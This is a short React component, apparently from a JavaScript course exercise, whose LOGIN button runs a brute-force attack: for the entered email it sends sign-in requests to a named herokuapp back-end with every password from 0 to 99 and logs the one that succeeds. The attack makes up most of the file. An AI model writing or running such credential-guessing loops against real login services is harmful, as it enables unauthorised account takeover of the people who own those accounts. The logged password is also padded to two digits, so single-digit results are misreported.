import React, { useState } from 'react';
import './App.css';


export default function App() {
  const [email, setEmail] = useState('');

  function handleSub(email){
    console.log(email);
    for(let section = 0; section <= 99; section++){
      const password = section.toString();
      fetch('https://tms-js-pro-back-end.herokuapp.com/api/users/signin', {
        method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({email, password})
      })
      .then((response) => {
        if(response.ok){
          console.log(`Your password is: ${password.padStart(2, "0")}`)
        }
      })
      .catch((err) => {
        console.log(err.name)
      })
    }
  }

  return (
    <div className='center'>
      <div style={{marginTop: "200px"}}>
        <input value={email} placeholder='email' 
          onChange={(e) => {
            setEmail(e.target.value);
          }} 
          style={{
            width:'200px',
            height:'20px',
          }}/>
          
        <div>
          <button onClick={() => {handleSub(email)}} style={{
            width:'200px',
            height:'20px',
            marginTop: "10px",
            fontSize: '12px'
          }}>LOGIN</button>
        </div>
      </div> 
    </div>
  );
};
